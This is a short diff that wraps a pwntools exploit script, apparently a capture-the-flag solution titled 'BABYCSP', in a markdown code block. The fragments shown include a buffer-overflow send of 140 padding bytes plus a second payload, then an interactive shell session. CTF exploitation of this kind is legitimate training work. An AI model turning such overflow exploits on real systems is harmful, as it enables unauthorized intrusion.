@@ -1,3 +1,6 @@
+# BABYCSP
+
+```python
 from pwn import *
 import time
 
@@ -60,3 +63,4 @@ r.send(b"A"*140 + payload2)
 
 r.interactive()
 
+```
